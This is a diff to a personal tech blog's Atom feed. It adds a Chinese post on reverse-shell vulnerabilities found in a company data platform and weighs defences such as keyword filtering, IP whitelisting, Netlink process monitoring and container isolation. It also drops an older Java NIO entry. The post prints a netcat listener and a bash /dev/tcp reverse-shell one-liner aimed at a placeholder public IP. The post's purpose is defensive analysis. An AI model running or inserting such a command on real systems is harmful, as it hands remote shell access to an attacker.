@@ -6,7 +6,7 @@
   <link href="https://dengchuncui.github.io/atom.xml" rel="self"/>
   
   <link href="https://dengchuncui.github.io/"/>
-  <updated>2021-05-04T06:10:23.709Z</updated>
+  <updated>2021-05-16T12:35:09.528Z</updated>
   <id>https://dengchuncui.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>shell反弹渗透技术分析和解决方案</title>
+    <link href="https://dengchuncui.github.io/2021/05/16/shell%E5%8F%8D%E5%BC%B9%E6%B8%97%E9%80%8F%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
+    <id>https://dengchuncui.github.io/2021/05/16/shell%E5%8F%8D%E5%BC%B9%E6%B8%97%E9%80%8F%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</id>
+    <published>2021-05-16T12:33:34.000Z</published>
+    <updated>2021-05-16T12:35:09.528Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="一-背景"><a href="#一-背景" class="headerlink" title="一. 背景"></a>一. 背景</h1><p>&nbsp;&nbsp;目前公司的产品的《命令行复测结果简报》中检测出反弹shell漏洞, 需要对该问题做出相关相关应对方案。</p><h1 id="二-反弹shell介绍"><a href="#二-反弹shell介绍" class="headerlink" title="二. 反弹shell介绍"></a>二. 反弹shell介绍</h1><p>&nbsp;&nbsp;反弹shell(reverse shell)，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制<br>端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的⻆色反转。<br>&nbsp;&nbsp;例子:  </p><ul><li>攻击者在其机器上监听端口  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 通过netcat工具监听 6767端口号(tcp&#x2F;udp)并且输出交互信息</span><br><span class="line"> nc -lvp 6767</span><br></pre></td></tr></table></figure></li><li>在被攻击端执行下面命令  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;产生一个交互的shell 并且建立socket连接读取这个文件</span><br><span class="line"> bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;公网ip&#x2F; 6767 0 &gt;&amp; 1</span><br></pre></td></tr></table></figure>&nbsp;&nbsp;反弹shell 时序图如下：<br><img src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/image.png" alt="image"></li></ul><h1 id="三-漏洞分析"><a href="#三-漏洞分析" class="headerlink" title="三. 漏洞分析"></a>三. 漏洞分析</h1><p>&nbsp;&nbsp;该漏洞的核心思想是在被攻击节点建立socket通道连接外网打通攻击者服务器,从而实现渗透。用户可以通过Datasimba 执行<br>shell 、python、jar 实现shell反弹,分析该问题目前能想到的解决思路如下:  </p><ul><li>限定被攻击节点对外访问请求；</li><li>监听 socket 通道的进程 发现即kill或报警</li><li>通过用户空间隔离技术(chroot)</li><li>通过容器虚拟化技术实现环境资源隔离<br>按照以上思路提供的解决方案</li></ul><h1 id="四-反弹shell防御方案"><a href="#四-反弹shell防御方案" class="headerlink" title="四. 反弹shell防御方案"></a>四. 反弹shell防御方案</h1><h5 id="方案一-产品功能对任务代码的关键字作限制"><a href="#方案一-产品功能对任务代码的关键字作限制" class="headerlink" title="方案一: 产品功能对任务代码的关键字作限制"></a>方案一: 产品功能对任务代码的关键字作限制</h5><ul><li>解释：代码中如果包含类似shell反弹的任务不能进行保存和运行  </li><li>优点：从源头上避免反弹shell代码进入到产品服务内部  </li><li>缺点：用户可以通过在代码中添加包含反弹shell的文件,或者通过下载外部文件的<br>方式绕过校验限制  </li></ul><h5 id="方案二-对被攻击节点-增加-ip白名单限制外网访问"><a href="#方案二-对被攻击节点-增加-ip白名单限制外网访问" class="headerlink" title="方案二: 对被攻击节点 增加 ip白名单限制外网访问"></a>方案二: 对被攻击节点 增加 ip白名单限制外网访问</h5><ul><li>解释：<br>i. 目前Dataworkes(阿里云) 对于ip白名单 shell反弹的解决思路<br>ii. 目前有的客户就是使用禁止外网访问的方式避免掉的  </li><li>优点：配置简单,从源头上解决问题,可以有效控制被攻击节点的ip</li><li>缺点：灵活性差,比如simba接入新的数据源,则数据源的ip需要添加到白名单中</li></ul><h5 id="方案三-自动防御shell反弹"><a href="#方案三-自动防御shell反弹" class="headerlink" title="方案三: 自动防御shell反弹"></a>方案三: 自动防御shell反弹</h5><ul><li>解释：通过linux IPC机制Netlink，用于在内核与用户进程之间传递消息,捕获进程事件信息，通过监控到的进程信息进行处理</li><li>优点：自动监控系统进程,发现非法进程直接kill,一般情况下绕过较难</li><li>缺点：i. 运维成本增加<br>ii. 通过上传可执行文件通过其他思路实现反弹,比如通过java或者python写一个SocketServer 程序执行.</li></ul><h5 id="方案四-通过容器虚拟化技术建立隔离操作系统"><a href="#方案四-通过容器虚拟化技术建立隔离操作系统" class="headerlink" title="方案四: 通过容器虚拟化技术建立隔离操作系统"></a>方案四: 通过容器虚拟化技术建立隔离操作系统</h5><ul><li>解释：<br>i.首先在产品的工作节点上通过docker技术创建出虚拟化的容器作为隔离层<br>ii.在功能中对于python、shell、jar任务类型在simba的工作节点上真正执行时我们会在隔离层<br>执行相关逻辑(只依赖其操作系统环境)。如果出现黑客攻击者通过shell反弹技术入侵其实操作的是虚拟出来的操作系统,不会对容器外<br>部的机器造成任何威胁。</li><li>优点: 通过容器虚拟化技术虚拟出新的操作系统实现完全的隔离。</li><li>缺点：对simba现有worker的工作节点进行架构优化改造，短时间内无法完成。</li></ul><h1 id="五-目前的思路"><a href="#五-目前的思路" class="headerlink" title="五. 目前的思路"></a>五. 目前的思路</h1><ul><li>思路一：通过方案二来从源头上解决问题(可能会增加额外的配置成本)</li><li>思路二: 可以通过方案一、方案三组合使用,通过方案一和方案三的优缺点进行互补,方案一从产品层面限制反弹<br>shell进入到产品平台,方案三可防止通过引用上传文件绕过的限制。可以避免大多数场景。理论上进入到产品平台的用户<br>大多数都是内部和已知用户都可以追溯和溯源(排除账号被盗问题)</li><li>思路三: 为了彻底解决非法用户通过编写其他技术方式实现所谓的’反弹’,后续会排期对产品的工作节点增加方案四-容器<br>虚拟化的方式来避免’反弹’问题。</li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;一-背景&quot;&gt;&lt;a href=&quot;#一-背景&quot; class=&quot;headerlink&quot; title=&quot;一. 背景&quot;&gt;&lt;/a&gt;一. 背景&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;目前公司的产品的《命令行复测结果简报》中检测出反弹shell漏洞, 需要对该问题做出相关相关应对</summary>
+      
+    
+    
+    
+    
+    <category term="网络安全" scheme="https://dengchuncui.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>10分钟了解SimbaFs解决hadoop存算分离问题</title>
@@ -456,30 +478,6 @@
     
     
     <summary type="html">&lt;h3 id=&quot;一、pipe&quot;&gt;&lt;a href=&quot;#一、pipe&quot; class=&quot;headerlink&quot; title=&quot;一、pipe&quot;&gt;&lt;/a&gt;一、pipe&lt;/h3&gt;&lt;h4 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h4&gt;&lt;p&gt; pipe 是nio管道2个线程之前的单项数据连接。&lt;br&gt; pipe 有2个通道一个是source通道一个是sink通道&lt;br&gt;数据会写入到source通道从sink通道获取数据。如图：&lt;br&gt;&lt;img src=&quot;https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-bd9f6b5abebf408b8ce8935ceb5fe357.png&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="NIO 系列" scheme="https://dengchuncui.github.io/categories/NIO-%E7%B3%BB%E5%88%97/"/>
-    
-    
-    <category term="java基础" scheme="https://dengchuncui.github.io/tags/java%E5%9F%BA%E7%A1%80/"/>
-    
-    <category term="NIO" scheme="https://dengchuncui.github.io/tags/NIO/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>java NIO 相关(五) 分散(Scatter) 和聚集(Gather)</title>
-    <link href="https://dengchuncui.github.io/2020/05/17/java%20NIO%E7%9B%B8%E5%85%B3(%E4%BA%94)%20%E5%88%86%E6%95%A3(Scatter)%20%E5%92%8C%E8%81%9A%E9%9B%86(Gather)/"/>
-    <id>https://dengchuncui.github.io/2020/05/17/java%20NIO%E7%9B%B8%E5%85%B3(%E4%BA%94)%20%E5%88%86%E6%95%A3(Scatter)%20%E5%92%8C%E8%81%9A%E9%9B%86(Gather)/</id>
-    <published>2020-05-16T17:20:10.000Z</published>
-    <updated>2021-05-04T06:31:15.745Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="分散-Scatter-和聚集-Gather"><a href="#分散-Scatter-和聚集-Gather" class="headerlink" title="分散(Scatter) 和聚集(Gather)"></a>分散(Scatter) 和聚集(Gather)</h3><p>分散读取(scattering reads) 是从channel中读取的数据“分散”到多个buffer中 </p><p><img src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-d7dd945680e34da1b55f41c09e4c583f.png" alt="image.png"></p><span id="more"></span><p>注意:按照缓冲区的顺序,写入position 和limit 之间的数据到channel </p><ul><li>分散读取<br>将通道中的数据分散到多个缓冲区中 </li><li>聚集写入<br>将多个缓冲区中的数据聚集到通道中 </li></ul>]]></content>
-    
-    
-    <summary type="html">&lt;h3 id=&quot;分散-Scatter-和聚集-Gather&quot;&gt;&lt;a href=&quot;#分散-Scatter-和聚集-Gather&quot; class=&quot;headerlink&quot; title=&quot;分散(Scatter) 和聚集(Gather)&quot;&gt;&lt;/a&gt;分散(Scatter) 和聚集(Gather)&lt;/h3&gt;&lt;p&gt;分散读取(scattering reads) 是从channel中读取的数据“分散”到多个buffer中 &lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-d7dd945680e34da1b55f41c09e4c583f.png&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;</summary>
     
     
     
